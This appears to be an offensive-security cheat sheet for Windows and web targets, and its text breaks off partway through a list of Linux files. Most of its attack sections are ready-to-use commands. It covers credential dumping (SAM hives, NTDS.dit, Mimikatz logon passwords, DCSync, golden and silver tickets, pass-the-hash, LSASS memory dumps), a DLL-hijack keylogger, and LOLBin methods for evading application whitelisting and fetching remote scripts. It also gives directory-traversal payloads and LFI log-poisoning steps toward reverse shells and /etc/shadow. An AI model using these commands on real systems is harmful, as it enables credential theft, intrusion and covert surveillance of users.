  --------------------------------------------------------------------------------------------------------

Crypto Commands
---------------

### Base64 Encode a File

  -----------------------------------------------------------
  certutil.exe -encode **\<inputfile\>** **\<outputfile\>**
  -----------------------------------------------------------

### Base64 Decode a File

  -----------------------------------------------------------
  certutil.exe -decode **\<inputfile\>** **\<outputfile\>**
  -----------------------------------------------------------

Credential Commands
-------------------

### Dumping Registry Hives (System User)

  ------------------------------------------------------
  reg.exe save hklm\\sam c:\\temp\\sam.save\
  reg.exe save hklm\\security c:\\temp\\security.save\
  reg.exe save hklm\\system c:\\temp\\system.save

  ------------------------------------------------------

### Dumping Windows Repair SAM & System (Windows XP, System User)

+-----------------------------+
| C:\\Windows\\Repair\\SAM    |
|                             |
| C:\\Windows\\Repair\\SYSTEM |
+-----------------------------+

### Dumping Windows Repair SAM & System (Windows 7, System User)

+------------------------------------------------+
| C:\\windows\\system32\\config\\RegBack\\SAM    |
|                                                |
| C:\\windows\\system32\\config\\RegBack\\SYSTEM |
+------------------------------------------------+

### Dump Active Directory NTDS.dit with NTDSUTIL

  ------------------------------------------------------------------------------
  ntdsutil "activate instance ntds" "IFM" "create full **\<outputfile\>**" q q
  ------------------------------------------------------------------------------

### Dump Active Directory NTDS.dit with Invoke-NinjaCopy

  -----------------------------------------------------------------------------------------------------------------------
  Invoke-NinjaCopy -Path "**\<path\>**\\ntds.dit" -ComputerName "**\<DCName\>**" -LocalDestination "**\<outputfile\>**"
  -----------------------------------------------------------------------------------------------------------------------

### Dump Active Directory NTDS.dit with Volume Shadow Copy

+-----------------------------------------------------------------------+
| wmic /node:**\<DC FQDN\>** /user:**\<domain\>**\\**\<user\>**         |
| /password:**\<password\>** process call create "cmd /c vssadmin       |
| create shadow /for=**\<driveletter**\>: 2\>&1 \> **\<logfile\>**      |
|                                                                       |
| wmic /node:**\<DC FQDN\>** /user:**\<domain\>**\\**\<user\>**         |
| /password:**\<password\>** process call create "cmd /c copy           |
| \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\**\<NTDS.dit\_Pat |
| h\>**                                                                 |
| **\<destination\_path\>** 2\>&1 \> **\<logfile\>**                    |
|                                                                       |
| wmic /node:**\<DC FQDN\>** /user:**\<domain\>**\\**\<user\>**         |
| /password:**\<password\>** process call create "cmd /c copy           |
| \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32 |
| \\config\\SYSTEM                                                      |
| **\<destination\_path\>** 2\>&1 \> **\<logfile\>**                    |
+-----------------------------------------------------------------------+

### Invoke-MimiKatz Retrieve All Credentials

  --------------------------------------------
  Invoke-Mimikatz -ComputerName **\<host\>**
  --------------------------------------------

### Invoke-MimiKatz Retrieve Credentials for a Single User from a DC

  -----------------------------------------------------------------------------------------------------------
  Invoke-Mimikatz -Command "lsadump::dcsync /domain:**\<domain FQDN\>** /user:**\<domain\>**\\**\<user\>**"
  -----------------------------------------------------------------------------------------------------------

### Invoke-MimiKatz Pass-the-Hash (PTH)

  ----------------------------------------------------------------------------------------------------------------------------
  Invoke-Mimikatz -Command "sekurlsa::pth /user:**\<user\>** /domain:**\<domain\>** /ntlm:**\<hash\>** /run:**\<program\>**"
  ----------------------------------------------------------------------------------------------------------------------------

### MimiKatz Get Logon Passwords (From Memory)

+--------------------------+
| privilege::debug         |
|                          |
| sekurlsa::logonpasswords |
+--------------------------+

### MimiKatz Dump Tickets (From Memory)

+---------------------------+
| privilege::debug          |
|                           |
| sekurlsa::tickets /export |
+---------------------------+

### MimiKatz Pass-the-Hash (PTH)

+-----------------------------------------------------------------------+
| privilege::debug                                                      |
|                                                                       |
| sekurlsa::pth /user:**\<user\>** /domain:**\<domain FQDN\>**          |
| /ntlm:**\<hash\>** /run:**\<cmd\>**                                   |
+-----------------------------------------------------------------------+

### MimiKatz Pass-the-Ticket (PTT) - Generate Golden Ticket

+-----------------------------------------------------------------------+
| privilege::debug                                                      |
|                                                                       |
| kerberos::golden /user:**\<user\>** /domain:**\<domain FQDN\>**       |
| /sid:**\<SID\>** /krbtgt:**\<hash\>** /ticket:**\<filename\>**        |
+-----------------------------------------------------------------------+

### MimiKatz Pass-the-Ticket (PTT) - Inject Golden Ticket

+-----------------------------------------------------------------------+
| privilege::debug                                                      |
|                                                                       |
| kerberos::golden /user:**\<user\>** /domain:**\<domain FQDN\>**       |
| /sid:**\<SID\>** /krbtgt:**\<hash\>** /ptt                            |
+-----------------------------------------------------------------------+

### MimiKatz Pass-the-Ticket (PTT) - Generate & Pass Silver Ticket

+-----------------------------------------------------------------------+
| privilege::debug                                                      |
|                                                                       |
| kerberos::silver /user:**\<user\>** /domain:**\<domain FQDN\>**       |
| /sid:**\<SID\>** /krbtgt:**\<hash\>** /target:**\<target FQDN\>**     |
| /service:**\<servicename\>** /ptt                                     |
+-----------------------------------------------------------------------+

### MimiKatz Pass-the-Ticket (PTT) - Passing a Ticket (Current Session)

+----------------------------------+
| privilege::debug                 |
|                                  |
| Kerberos::ptt **\<ticketfile\>** |
+----------------------------------+

### MimiKatz Elivate to SYSTEM (Must be Administrator)

  ----------------
  token::elevate
  ----------------

### MimiKatz Dump SAM (Live, Requires SYSTEM)

  --------------
  lsadump::sam
  --------------

### MimiKatz Dump SAM (From Backup)

  -------------------------------------------------
  lsadump::sam **\<systemfile\>** **\<samfile\>**
  -------------------------------------------------

### MimiKatz Dump Specific User Hash (LSA)

  -----------------------------------------
  lsadump::lsa /inject /name:**\<user\>**
  -----------------------------------------

### MimiKatz Dump Specific User Hash (DC Synchronization)

  --------------------------------------------------------------------
  lsadump::dcsync /domain:**\<domain FQDN**\> /user:**\<username\>**
  --------------------------------------------------------------------

### MimiKatz Dump Service Password

+--------------------+
| privilege::debug   |
|                    |
| token::elevate     |
|                    |
| vault::cred /patch |
+--------------------+

### MimiKatz Dump DPAPI Creds

+-----------------------------------------------------------------------+
| privilege::debug                                                      |
|                                                                       |
| token::elevate                                                        |
|                                                                       |
| dpapi::cred                                                           |
| /in:%systemroot%\\System32\\config\\systemprofile\\AppData\\Local\\Mi |
| crosoft\\Credentials\\**\<credentialfile\>**                          |
+-----------------------------------------------------------------------+

### RUNAS to Create Token & Run Process (Password Known)

  -------------------------------------------------------------------
  runas /netonly /user:**\<domain\>**\\**\<user\>** **\<command\>**
  -------------------------------------------------------------------

**Note:** You will still be recognized as the user your ran the command
as on the local system. Remote systems will see the token you generated.
This is how Pass-the-Hash (PTH)works. This technique can be used to
build the hash needed for a PTH.

Keylogging & Desktop Monitoring
-------------------------------

### Start Recording Screens with Problem Step Recorder (Must be run with user's credentials)

  -----------------------------------------------------
  psr.exe /start /gui 0 /output **\<ZIP file path\>**
  -----------------------------------------------------

### Stop Recording Screens with Problem Step Recorder

  -------------------------------------------------------------------
  psr.exe /IT /RU **\<domain\>**\\**\<user\>** /RP **\<password\>**
  -------------------------------------------------------------------

### Keylogging with DLL Hijacking

Compile a Keylogger as a DLL and place it in the following directory,
then kill and **explorer.exe**:

  ----------------------------------------------
  \\\\**\<host\>**\\C\$\\Windows\\linkinfo.dll
  ----------------------------------------------

**Note:** Logging will start once the user clicks the Start button.

Network Tricks
--------------

### Pivot with NETSH

  -----------------------------------------------------------------------------------------------------------------------------------------------
  netsh interface portproxy add v4tov4 listenport=**\<LPORT\>** listenaddress=0.0.0.0 connectionport=**\<FPORT\>** connectaddress=**\<FHOST\>**
  -----------------------------------------------------------------------------------------------------------------------------------------------

### Remove Pivot with NETSH

  ---------------------------------
  netsh interface portproxy reset
  ---------------------------------

Windows Miscellaneous Commands
------------------------------

### Abort Windows Shutdown

  -------------
  shutdown /a
  -------------

### Enable Remote Desktop (Registry)

+-----------------------------------------------------------------------+
| reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" |
| /v fDenyTSConnections /t                                              |
|                                                                       |
| REG\_DWORD /d 0 /f                                                    |
+-----------------------------------------------------------------------+

### List Group Policy

  --------------
  gpresults /z
  --------------

### List All Files In a Directory Including Hidden & System

  --------
  dir /a
  --------

Windows GUI Shortcuts & Commands
--------------------------------

### Open Explorer In Folder View

  ------------------------------------
  explorer.exe /e **\<folderpath\>**
  ------------------------------------

### Open Programs and Features (Add/Remove Programs)

  ------------
  appwiz.cpl
  ------------

AccessChk.exe (Sysinternals)
----------------------------

### Check Specific Service Permissions

  -----------------------------------------------------
  accesschk.exe /accepteula -ucqv **\<servicename\>**
  -----------------------------------------------------

### Check For Any Service Permissions (pre-Windows 8)

  -------------------------------------------------------------
  accesschk.exe /accepteula -uwcqv \"Authenticated Users\" \*
  -------------------------------------------------------------

### Find all Directories Writable By Users

  -----------------------------------------------------
  accesschk.exe /accepteula -uwdqs Users **\<path\>**
  -----------------------------------------------------

### Find all Directories Writable By Authenticated Users

  ---------------------------------------------------------------------
  accesschk.exe /accepteula -uwdqs "Authenticated Users" **\<path\>**
  ---------------------------------------------------------------------

### Find all Files Writable By Users

  -----------------------------------------------------------
  accesschk.exe /accepteula -uwqs Users **\<path\>**\\\*.\*
  -----------------------------------------------------------

### Find all Files Writable By Authenticated Users

  ---------------------------------------------------------------------------
  accesschk.exe /accepteula -uwqs "Authenticated Users" **\<path\>**\\\*.\*
  ---------------------------------------------------------------------------

Commands That do Other Things (LOLBins: Inspired by Odvar Moe's list)
---------------------------------------------------------------------

### Run Commands with ForFiles

  ---------------------------------------------------------------------------------------------------
  forfiles /p **\<path\_to\_look\_in\>** /m **\<file\_to\_look\_for\>** /c **\<command\_to\_run\>**
  ---------------------------------------------------------------------------------------------------

### Run Commands with Bash (If git is installed)

  --------------------------------------
  bash.exe -c **\<command\_to\_run\>**
  --------------------------------------

### Run Commands with ScriptRunner.exe (Part of Application Virtualization Client)

  -------------------------------------------------------
  scriptrunner.exe -appvscript **\<command\_to\_run\>**
  -------------------------------------------------------

### Run Commands with SyncAppVPublishingServer.exe (Part of Application Virtualization Client)

  ---------------------------------------------------------------
  SyncAppVPublishingServer.exe "n; **\<PowerShell\_Commants\>**
  ---------------------------------------------------------------

### Open an HTML or File Path with hh.exe

  ------------------------------
  hh.exe **\<url\_or\_path\>**
  ------------------------------

### Run PowerShell Via JavaScript with RunDLL32.exe

  ------------------------------------------------------------------------------------------
  rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \"**\<PowerShell\_Commands\>**\"
  ------------------------------------------------------------------------------------------

### Run Remote SCT Scripts with RegSvr32.exe

  ----------------------------------------------------------
  regsvr32.exe /s /n /u /i:**\<url\_to\_sct\>** scrobj.dll
  ----------------------------------------------------------

### Run Commands with RegSvcs.exe & RegAsm.exe

Create a C\# project that utilizes the DLL Register & Unregister
Methods, similar to this example:
[[https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07]{.underline}](https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07)

+-----------------------------------------------------------------------+
| C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe            |
| /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll     |
| /keyfile:key.snk **\<c\#\_project\>**                                 |
|                                                                       |
| To use the register module:                                           |
|                                                                       |
| > regsvcs.exe regsvcs.dll                                             |
| >                                                                     |
| > OR                                                                  |
| >                                                                     |
| > Regasm.exe regsvcs.dll                                              |
|                                                                       |
| To use unregister module:                                             |
|                                                                       |
| > Regsvcs.exe /U regsvcs.dll                                          |
| >                                                                     |
| > OR                                                                  |
| >                                                                     |
| > Regasm.exe /U regsvcs.dll                                           |
+-----------------------------------------------------------------------+

### Run Commands with BgInfo.exe

Create a custom \*.bgi file that will execute your custom VBS commands.
Similar to what is described here:

-   [[https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/]{.underline}](https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/)

-   [[https://msitpros.com/?p=3831]{.underline}](https://msitpros.com/?p=3831)

  ----------------------------------------------------------
  bginfo.exe **\<custom\_bgi\_file\>** /popup /nolicprompt
  ----------------------------------------------------------

### Run Commands with Custom DLLs

Example located here:
[[https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290]{.underline}](https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290)

  ----------------------------------------------------------------------
  InstallUtil.exe /logfile= /LogToConsole=false /U **\<custom\_dll\>**
  ----------------------------------------------------------------------

### Run Remote .NET Code with IEEXEC.EXE

  --------------------------------------------
  ieexec.exe **\<url\_to\_DotNet\_binary\>**
  --------------------------------------------

### Run Commands with msxsl.exe

Create XML files to execute JScript. A write up is located here:

  ------------------------------------
  msxsl.exe customers.xml script.xsl
  ------------------------------------

### Run Commands with odbcconf.exe

Build a C\# project that will be built as a DLL then registered and run
with odbcconf.exe:
[[https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce]{.underline}](https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce)

  ------------------------
  odbcconf.exe /f my.rsp
  ------------------------

### Dump LSASS Process Memory with sqldumper.exe

  ----------------------------------------------
  sqldumper.exe **\<lsass\_pid\>** 0 0x0110:40
  ----------------------------------------------

### Run Commands with pcalua.exe

  -------------------------------
  pcalua.exe -a **\<command\>**
  -------------------------------

### Running Commands with msiexec.exe

-   [[https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/]{.underline}](https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/)

  --------------------------------------------------------------
  msiexec /quiet /i **\<msi\_with\_msi\_or\_png\_extention\>**
  --------------------------------------------------------------

### Running Commands with cmstp.exe

-   [[https://msitpros.com/?p=3960]{.underline}](https://msitpros.com/?p=3960)

-   [[https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e]{.underline}](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e)

  -----------------------------------------
  cmstp.exe /ni /s **\<malicious\_inf\>**
  -----------------------------------------

### DLL Loading with xwizard.exe

-   [[http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/]{.underline}](http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/)

  -----------------------------------------------------------------------------
  Drop your malicious DLL into the same directory and xwizard.exe and run it.
  -----------------------------------------------------------------------------

### DLL Injection with MavInject32.exe

  --------------------------------------------------------------------------------------------------------------------------------
  \"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe\" **\<PID\>** /INJECTRUNNING **\<PATH DLL\>**
  --------------------------------------------------------------------------------------------------------------------------------

### Running C\# with csi.exe (Interactive)

-   [[https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html]{.underline}](https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html)

  --------------------------------------
  Run csi.exe and enter your C\# code.
  --------------------------------------

### Running F\# with fsi.exe (Interactive)

-   [[https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1]{.underline}](https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1)

  --------------------------------------
  Run fsi.exe and enter your F\# code.
  --------------------------------------

### Creating a Control Panel to Execute Code (DLL)

-   [[https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/]{.underline}](https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/)

  --------------------------------------------------------------------------------
  Create a dll and add a registry key to the HKCU hive to obtain code execution.
  --------------------------------------------------------------------------------

### Run Commands with dnx.exe

-   [[https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/]{.underline}](https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/)

+----------------------------------------------------------+
| Write C\# file and accompanying JSON File, then execute: |
|                                                          |
| dnx.exe **\<appname\>**                                  |
+----------------------------------------------------------+

### Run Commands with cdb.exe

-   [[http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html]{.underline}](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)

-   [[https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda]{.underline}](https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda)

  --------------------------------------------------
  cdb.exe -cf **\<wds\_file\>** -o **\<command\>**
  --------------------------------------------------

### Run Commands with MSBuild Using PowerShell

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------
  \[Reflection.Assembly\]::LoadWithPartialName(\'[http://Microsoft.Build](https://t.co/2nLz1YPu43) \');\
  [\$e](https://twitter.com/search?q=%24e&src=ctag)=new-object [http://Microsoft.Build](https://t.co/2nLz1YPu43) .Evaluation.Project(\'**\<csproj\_file\>**\');\
  [\$e](https://twitter.com/search?q=%24e&src=ctag).Build();

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------

Directory Traversals
====================

+------------------------------------------------+
| ../\                                           |
| ..\\\                                          |
| ..\\/\                                         |
| %2e%2e%2f\                                     |
| %252e%252e%252f                                |
|                                                |
| \%255c..%255c                                  |
|                                                |
| /%252e%252e/                                   |
|                                                |
| \%255c%255c..%255c\                            |
| %c0%ae%c0%ae%c0%af\                            |
| %uff0e%uff0e%u2215\                            |
| %uff0e%uff0e%u2216\                            |
| \..././\                                       |
| \...\\.\\                                      |
|                                                |
| ..%c0%af represents ../\                       |
| ..%c1%9c represents ..\\                       |
|                                                |
| Prepend \"/public/\" to all aof the above.     |
|                                                |
| Try absolute paths (with encoding?):           |
|                                                |
| /file://absolute/path/\<traversal\>/etc/passwd |
+------------------------------------------------+

Reverse Engineering Commands
============================

Strings
-------

### List Strings From File

  --------------------------
  strings **\<ELF File\>**
  --------------------------

Objcopy
-------

### Copy/Rip Debugging Symbols From a Binary

  -------------------------------------------------------------------------------------
  objcopy \--only-keep-debug rip\_from\_binary **\<ELF Binary w/Debugging Symbols\>**
  -------------------------------------------------------------------------------------

### Add Debugging Symbols to a Binary

  -----------------------------------------------------------------
  objcopy \--add-gnu-debuglink=**\<symbol file\> \<ELF Binary\>**
  -----------------------------------------------------------------

Strip
-----

### Strip Debugging & Other Symbols

This can be useful if attempting to hide or make more difficult the
analysis of an executable. It can also reduce the size of a binary.

  -----------------------------------------------------------
  strip \--strip-debug \--strip-unneeded **\<ELF Binary\>**
  -----------------------------------------------------------

NM
--

### Display All Symbols

  ------------------------
  nm -a **\<ELF File\>**
  ------------------------

### Display Sorted Symbols

  ------------------------
  nm -n **\<ELF File\>**
  ------------------------

### Display External Symbols

  ------------------------
  nm -g **\<ELF File\>**
  ------------------------

### Display Symbol Sizes

  ------------------------
  nm -S **\<ELF File\>**
  ------------------------

### Command Symbol Types

  **Symbol Type**   **Meaning**
  ----------------- -----------------------------------------
  A                 Absolute Symbol
  B                 In the Uninitialized Data Section (BSS)
  D                 In the Initialized Data Section
  N                 Debugging Symbol
  T                 In the Text Section
  U                 Symbol Undefined

Strace
------

### Show Timestamps in Output

  ----------------------------
  strace -t **\<ELF File\>**
  ----------------------------

### Show Relative Timestamps in Output

  ----------------------------
  strace -r **\<ELF File\>**
  ----------------------------

### Trace Specified System Calls

  -----------------------------------------------------
  strace -e **\<comma separated list\> \<ELF File\>**
  -----------------------------------------------------

### Trace a Running Process (As root)

  -----------------------
  strace -p **\<PID\>**
  -----------------------

### Trace Syscall Statistics

  ----------------------------
  strace -c **\<ELF File\>**
  ----------------------------

GNU Debugger Commands (gdb)
---------------------------

### Get ELF Details (Find the entry point)

  -----------------------------------
  shell readelf -h **\<filename\>**
  -----------------------------------

### Run the Program

  ------------------------------
  run **\<command\> \<args\>**
  ------------------------------

### List Functions

  ----------------
  info functions
  ----------------

### List Variables

  ----------------
  info variables
  ----------------

### List Variables in a Function

  ----------------------------------
  info scope **\<function name\>**
  ----------------------------------

### Load Debugging Symbols from a File

  ---------------------------------
  symbol-file **\<symbol file\>**
  ---------------------------------

### List Program Source (If available)

  --------------------------
  list **\<line number\>**
  --------------------------

### Set Breakpoint

  ------------------------------------------------------------
  break **\<function name\|line number\|\*memory address\>**
  ------------------------------------------------------------

### Show Breakpoints

  ------------------
  info breakpoints
  ------------------

### Disable Breakpoint

  -----------------------------------
  disable **\<breakpoint number\>**
  -----------------------------------

### Enable Breakpoint

  ----------------------------------
  enable **\<breakpoint number\>**
  ----------------------------------

### Delete Breakpoint

  ----------------------------------
  delete **\<breakpoint number\>**
  ----------------------------------

### Continue After Hitting Breakpoint

  ----------
  continue
  ----------

### Step by Instruction

  ----------------------
  stepi **\<number\>**
  ----------------------

### Step by Line

  ---------------------
  step **\<number\>**
  ---------------------

### Inspect CPU Registers (while running)

  -------------------
  inspect registers
  -------------------

### Examine Memory Address

  ------------------------------------------------------
  x/**\<repeat count\>\<format\>\<size\> \<address\>**
  ------------------------------------------------------

### Print Variable Information

  -----------------------------
  print **\<variable name\>**
  -----------------------------

### Disassemble Function

  -----------------------------------
  disassemble **\<function name\>**
  -----------------------------------

### Change Memory Values of Running Program

  --------------------------------------------------------------------
  set {**\<data type\>**} **\<memory address\>** = **\<new value\>**
  --------------------------------------------------------------------

### Addressing a Specific Byte In Memory Address

  --------------------------------------------
  (**\<memory address\>** + **\<integer\>**)
  --------------------------------------------

### Set Convenience Variable

  ---------------------------------------------
  set \$**\<variable name\>** = **\<value\>**
  ---------------------------------------------

### Call a Function (Any function within the scope of the program)

  ------------------------------------------
  call \<**function\>**(**\<arguments\>**)
  ------------------------------------------

### Change Disassembly Flavor to Intel

  ------------------------------
  set disassembly-flavor intel
  ------------------------------

Immunity Debugger
=================

Ignore Access Violations (Useful when debugging shellcode with System calls)
----------------------------------------------------------------------------

+-----------------------------------------------------+
| 1.  Click **Debugging Options**.                    |
|                                                     |
| 2.  Click the **Exceptions** tab.                   |
|                                                     |
| 3.  Add the following ranges:                       |
|                                                     |
|     a.  0xC0000005 - ACCESS VIOLATION               |
|                                                     |
|     b.  0x80000001 - STATUS\_GUARD\_PAGE\_VIOLATION |
+-----------------------------------------------------+

Encoding & Decoding
===================

Base64
------

### PowerShell

#### Encode a String

+--------------------------------------------------------------+
| \$Text = '**\<TEXT\>**'                                      |
|                                                              |
| \$Bytes = \[System.Text.Encoding\]::Unicode.GetBytes(\$Text) |
|                                                              |
| \$EncodedText =\[Convert\]::ToBase64String(\$Bytes)          |
+--------------------------------------------------------------+

#### Decode Base64 Encoded String

+-----------------------------------------------------------------------+
| \$EncodedText = "**\<Base64\_String\>**"                              |
|                                                                       |
| \$DecodedText =                                                       |
| \[System.Text.Encoding\]::Unicode.GetString(\[System.Convert\]::FromB |
| ase64String(\$EncodedText))                                           |
+-----------------------------------------------------------------------+

#### Encode a Byte Array

+--------------------------------------------------+
| \$bytes = \[Byte\[\]\] ( **\<Byte\_Array\>** )   |
|                                                  |
| \$Encoded = \[Convert\]::ToBase64String(\$bytes) |
+--------------------------------------------------+

#### Decode a Base64 Encoded Byte Array

+----------------------------------------------------+
| \$Encoded = "\<Base64\_String\>"                   |
|                                                    |
| \$Bytes = \[Convert\]::FromBase64String(\$Encoded) |
+----------------------------------------------------+

### Python

#### Encode a String

+------------------------------------+
| import Base64                      |
|                                    |
| Base64.b64Encode(**\'\<TEXT\>**\') |
+------------------------------------+

#### Decode Base64 Encoded String

+----------------------------------------------+
| import Base64                                |
|                                              |
| Base64.b64Decode(\'**\<Base64\_String\>**\') |
+----------------------------------------------+

### JavaScript

#### Encode a String

  ------------------------
  btoa(\'**\<TEXT\>**\')
  ------------------------

#### Decode Base64 Encoded String

  ----------------------------------
  atob(\'**\<Base64\_String\>**\')
  ----------------------------------

Escaped/Unescaped Unicode
-------------------------

### Javascript

#### Encode a String

+-----------------------------------------------------------------------+
| String.prototype.toUnicode = function(){                              |
|                                                                       |
| > var result = \"\";                                                  |
| >                                                                     |
| > for(var i = 0; i \< this.length; i++){                              |
| >                                                                     |
| > // Assumption: all characters are \< 0xffff                         |
| >                                                                     |
| > result += \"\\\\u\" + (\"000\" +                                    |
| > this\[i\].charCodeAt(0).toString(16)).substr(-4);                   |
| >                                                                     |
| > }                                                                   |
| >                                                                     |
| > return result;                                                      |
|                                                                       |
| };                                                                    |
|                                                                       |
| Examples:                                                             |
|                                                                       |
| \"みどりいろ\".toUnicode(); //\"\\u307f\\u3069\\u308a\\u3044\\u308d\" |
|                                                                       |
| \"Mi Do Ri I Ro\".toUnicode();                                        |
| //\"\\u004d\\u0069\\u0020\\u0044\\u006f\\u0020\\u0052\\u0069\\u0020\\ |
| u0049\\u0020\\u0052\\u006f\"                                          |
| \"Green\".toUniCode(); //\"\\u0047\\u0072\\u0065\\u0065\\u006e\"      |
+-----------------------------------------------------------------------+

Escaped/Unescaped Hex
---------------------

### Binary File to Escaped Hex String (Linux)

  -------------------------------------------------------------------------------------------------------------------------
  od -tx1 **\<file\_name\>** \| sed -e \'s/\^\[0-9\]\* //\' -e \'\$d\' -e \'s/\^/ /\' -e \'s/ /\\\\x/g\' \| tr -d \'\\n\'
  -------------------------------------------------------------------------------------------------------------------------

### Escaped Hex to Binary File (PowerShell)

+-----------------------------------------------------------------------+
| \# Create an empty zero length Byte\[\] array                         |
|                                                                       |
| \$decodedBytes = @()                                                  |
|                                                                       |
| \# Escaped byte sequence to decode. This function should decode most  |
| sequences                                                             |
|                                                                       |
| \$escapedByteString = \"\\x48\\x65\\x6C\\x6C\\x6F\"                   |
|                                                                       |
| \# Remove white spaces and other non-hex values                       |
|                                                                       |
| \$byteString = \$escapedByteString.ToLower() -Replace                 |
| \'\[\^a-f0-9\\\\,x\\-\\:\]\',\'\'                                     |
|                                                                       |
| \# Remove the most common delimiters                                  |
|                                                                       |
| \$byteString = \$byteString -Replace \'0x\|\\\\x\| \|\\-\|\\:\',\'\'  |
|                                                                       |
| \# Step through the string two characters at a time and convert them  |
| to a byte array.                                                      |
|                                                                       |
| for (\$i = 0; \$i -lt \$byteString.Length ; \$i += 2)                 |
|                                                                       |
| {                                                                     |
|                                                                       |
| \$decodedBytes += \[Byte\]::Parse(\$byteString.Substring(\$i, 2),     |
| \[System.Globalization.NumberStyles\]::HexNumber)                     |
|                                                                       |
| }                                                                     |
|                                                                       |
| \# Write the decoded bytes to a binary file.                          |
|                                                                       |
| \[io.file\]::WriteAllBytes(\'output.bin\',\$decodedBytes)             |
+-----------------------------------------------------------------------+

Python Escape Bytes
-------------------

+--------------------------------------------------------------------------+
| s = \'**\<bytes\>**\'                                                    |
|                                                                          |
| sx = r\"\\x\" + r\"\\x\".join(s\[n : n+2\] for n in range(0, len(s), 2)) |
+--------------------------------------------------------------------------+

URL Encoding
------------

### Python 2.x.x

+-----------------------------------------------------------------+
| import urllib                                                   |
|                                                                 |
| urlEncoded = urllib.quote\_plus(\"**\<string\_to\_encode\>**\") |
+-----------------------------------------------------------------+

### Python 3.x.x

+-----------------------------------------------------------------------+
| import urllib.parse                                                   |
|                                                                       |
| urlEncoded = urllib.parse.quote\_plus(\"**\<string\_to\_encode\>**\") |
+-----------------------------------------------------------------------+

Local File Include (LFI)
========================

General Hints
-------------

Look for useful files such as:

-   Configuration files

    -   Passwords

    -   Valuable information

-   Database files

    -   Passwords

    -   Valuable information

-   Registry Backup Files (SAM & Security hives)

    -   Passwords

-   Log files

    -   SSH logs

    -   Apache logs

    -   It is possible to add PHP to a web request or other log and then
        > include the log file to gain execution.

        -   Reverse Shell via shell\_exec()

        -   Add a web-shell that executes supplied commands

-   Emails

    -   Send an email containing PHP and include it.

-   File uploads?

    -   Image metadata

-   Code Execution possibility

    -   /proc/self/environ&cmd=ls (Will execute \"ls\" command, The
        > command can be complex if this works. I.e. full Python reverse
        > shell, etc.)

Null Terminators
----------------

+--------+
| \%00   |
|        |
| \%2500 |
+--------+

Interesting Files (Linux)
-------------------------

+------------------------------------------+
| /etc/issue                               |
|                                          |
| /proc/version                            |
|                                          |
| /etc/profile                             |
|                                          |
| /etc/passwd                              |
|                                          |
| /etc/shadow                              |
|                                          |
| /root/.bash\_history                     |
|                                          |
| /var/log/dmessage                        |
|                                          |
| /var/mail/root                           |
|                                          |
| /var/spool/cron/crontabs/root            |
|                                          |
| /proc/self/environ                       |
|                                          |
| /var/log/mail/**\<user\>**               |
|                                          |
| /var/log/apache2/access.log              |
|                                          |
| /proc/self/environ                       |
|                                          |
| /tmp/sess\_ID and /var/lib/php5/sess\_ID |
|                                          |
| /var/log/auth.log                        |
|                                          |
| /etc/passwd                              |
|                                          |
| /etc/shadow                              |
|                                          |
| /etc/aliases                             |
|                                          |
| /etc/anacrontab                          |
|                                          |
| /etc/apache2/apache2.conf                |
|                                          |
| /etc/apache2/httpd.conf                  |
|                                          |
| /etc/at.allow                            |
|                                          |
| /etc/at.deny                             |
|                                          |
| /etc/bashrc                              |
|                                          |
| /etc/bootptab                            |
|                                          |
| /etc/chrootUsers                         |
|                                          |
| /etc/chttp.conf                          |
|                                          |
| /etc/cron.allow                          |
|                                          |
| /etc/cron.deny                           |
|                                          |
| /etc/crontab                             |
|                                          |
| /etc/cups/cupsd.conf                     |
|                                          |
| /etc/exports                             |
|                                          |
| /etc/fstab                               |
|                                          |
| /etc/ftpaccess                           |
|                                          |
| /etc/ftpchroot                           |
|                                          |
| /etc/ftphosts                            |
|                                          |
| /etc/groups                              |
|                                          |
| /etc/grub.conf                           |
|                                          |
| /etc/hosts                               |
|                                          |
| /etc/hosts.allow                         |
|                                          |
| /etc/hosts.deny                          |
|                                          |
| /etc/httpd/access.conf                   |
|                                          |
| /etc/httpd/conf/httpd.conf               |
|                                          |
| /etc/httpd/httpd.conf                    |
|                                          |
| /etc/httpd/logs/access\_log              |
|                                          |
| /etc/httpd/logs/access.log               |
|                                          |
| /etc/httpd/logs/error\_log               |
|                                          |
| /etc/httpd/logs/error.log                |
|                                          |
| /etc/httpd/php.ini                       |
|                                          |
